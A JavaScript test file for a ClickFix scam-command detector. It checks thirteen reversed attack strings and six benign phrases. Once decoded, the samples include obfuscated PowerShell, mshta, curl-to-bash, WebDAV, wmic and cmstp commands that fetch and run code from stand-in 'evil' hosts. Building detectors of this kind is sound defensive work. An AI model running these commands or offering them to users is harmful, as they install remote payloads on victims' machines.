// Tests for detect.js (same cases as RustWolf's guard::tests::clickfix). Run: node build/guard/test_detect.js
//
// The scam examples are stored REVERSED (and un-reversed when the test runs), so antivirus
// software that scans source files doesn't mistake this test for a real ClickFix payload.
"use strict";
const fs = require("fs");
const path = require("path");
const c = new Function(fs.readFileSync(path.join(__dirname, "detect.js"), "utf8") + "\nreturn frostwolfLooksLikeCommand;")();
const r = (s) => [...s].reverse().join("");

const scams = [
  '1284 :DI noitacifireV - tobor a ton ma I ✅ # "xei | 1sp.x/live//:ptth rwi" c- neddih w- llehsrewop',
  "ath.yfirev/elpmaxe.live//:sptth athsm",
  "AFgAFEQS cne- llehsrewop nim/ trats c/ dmc",
  "hsab | hs.a/elpmaxe.x//:ptth s- lruc",
  ")elpmaxe.live mri(xei c- h w- l^l^e^h^s^r^e^w^o^p",
  'imaohw c- pon- llehsre""wop',
  "imaohw c- llehs`rew`op",
  "x/elpmaxe.live//:ptth a^t^h^s^m",
  "exe.yfirev\\tooRWWWvaD\\LSS@elpmaxe.live\\\\",
  "clac etaerc llac ssecorp cimw",
  "fni.x\\:C ua/ ptsmc",
  "erom | elpmaxe.live@yfirev regnif",
  '")hs.i/elpmaxe.live//:ptth lruc($" c- hsab',
].map(r);
const normal = [
  "Hello, here is my email address",
  "https://example.com/article?id=3",
  "The command line is a text interface.",
  'I love my "quoted" text and a^b math',
  "my finger hurts after typing all day",
  "git clone https://github.com/x/y",
];
let fail = 0;
for (const s of scams) if (!c(s)) { fail++; console.log("MISSED scam example", scams.indexOf(s) + 1); }
for (const s of normal) if (c(s)) { fail++; console.log("FALSE ALARM:", s); }
console.log(fail ? `${fail} failures` : `all ${scams.length + normal.length} checks pass`);
process.exit(fail ? 1 : 0);
